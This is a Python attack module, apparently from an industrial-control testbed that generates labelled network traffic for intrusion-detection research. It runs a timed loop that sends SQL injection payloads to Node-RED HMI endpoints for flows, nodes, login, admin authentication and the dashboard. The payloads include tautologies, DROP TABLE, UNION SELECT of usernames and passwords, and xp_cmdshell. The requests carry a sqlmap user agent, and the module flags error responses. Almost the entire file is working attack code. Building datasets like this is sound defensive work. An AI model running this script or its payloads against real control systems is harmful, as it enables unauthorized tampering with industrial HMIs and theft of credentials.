"""
Attack #9: NodeRED_API_Injection (Node-RED HTTP API Injection)
=================================================
SCADANet stats: 383 packets, Tcp_len≈42B -> few packets but targeted
Sends injected payloads into Node-RED HTTP API endpoints (flow/node configuration,
login, admin-auth, dashboard) in an attempt at unauthorized interaction with the HMI layer.
Effect: potential manipulation of HMI flow/node configuration, bypass of login/auth logic.

MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message
Zeek signature: http.log -> uri containing injection keywords, status_code
"""

import time
import sys
import os
import socket
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    HMI_IP, HMI_PORT, DEFAULT_NET_DURATION,
    LABEL_NODERED_API_INJECTION, NET_DURATIONS
)

ATTACK_NAME = "NodeRED_API_Injection"
ATTACK_ID   = LABEL_NODERED_API_INJECTION

# SCADANet: 383 packets / 300s -> ~1.3 pkt/s (targeted, slow)
PKT_INTERVAL = 0.75   # ~1.3 requests per second

# Injection payloads (URL encoded) sent against the Node-RED API parameters
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT 1,username,password FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT * FROM information_schema.tables",
    "' AND 1=2 UNION ALL SELECT NULL,NULL,NULL--",
    "1 OR 1=1",
    "') OR ('1'='1",
    "'; EXEC xp_cmdshell('whoami')--",
    "1; SHOW DATABASES;",
    "' OR 'x'='x",
]

# Target URLs (Node-RED API + HMI endpoints)
INJECTION_TARGETS = [
    "/api/flows?id={}",
    "/api/nodes?type={}",
    "/ui/#!/?node={}",
    "/login?username={}&password=test",
    "/api/admin/auth?token={}",
    "/?search={}",
    "/dashboard?view={}",
]


def _send_sqli(ip: str, port: int, path: str) -> dict:
    """Send an injection payload via HTTP GET."""
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {ip}:{port}\r\n"
        f"User-Agent: sqlmap/1.7.8\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((ip, port))
        s.sendall(req)
        resp = s.recv(512).decode(errors="replace")
        s.close()
        code = resp.split(" ")[1] if " " in resp else "???"
        # Does the response contain an error message?
        sqlerr = any(k in resp.lower() for k in [
            "sql", "syntax", "mysql", "postgresql", "sqlite", "error", "warning"
        ])
        return {"status": code, "sql_error": sqlerr}
    except Exception as e:
        return {"status": "ERR", "sql_error": False}


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("nodered_injection", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = HMI_IP

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: http://{target_ip}:{HMI_PORT}")
    print(f"  {len(SQL_PAYLOADS)} injection payloads x {len(INJECTION_TARGETS)} endpoints")
    print(f"  Rate: ~1.3 req/s (SCADANet calibration)")
    print(f"  Duration: {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"NodeRED API injection -> {target_ip}:{HMI_PORT}, {len(SQL_PAYLOADS)} payloads"
        )

    start_time    = time.time()
    req_count     = 0
    sql_errors    = 0

    try:
        while (time.time() - start_time) < duration_sec:
            payload   = random.choice(SQL_PAYLOADS)
            endpoint  = random.choice(INJECTION_TARGETS).format(
                payload.replace(" ", "+").replace("'", "%27"))
            result    = _send_sqli(target_ip, HMI_PORT, endpoint)
            req_count += 1

            if result["sql_error"]:
                sql_errors += 1
                print(f"  [NODERED] ERROR RESPONSE DETECTED! payload={payload[:30]}")
            elif req_count % 20 == 0:
                elapsed = time.time() - start_time
                rem     = duration_sec - elapsed
                print(f"  [NODERED] {req_count} requests | {sql_errors} error responses | "
                      f"remaining: {rem:.0f}s")

            time.sleep(PKT_INTERVAL)

    except KeyboardInterrupt:
        print("\n  [NODERED] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{req_count} requests, {sql_errors} error responses, {elapsed:.1f}s"
            )
        print(f"\n  [NODERED] {req_count} requests | {sql_errors} error responses | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
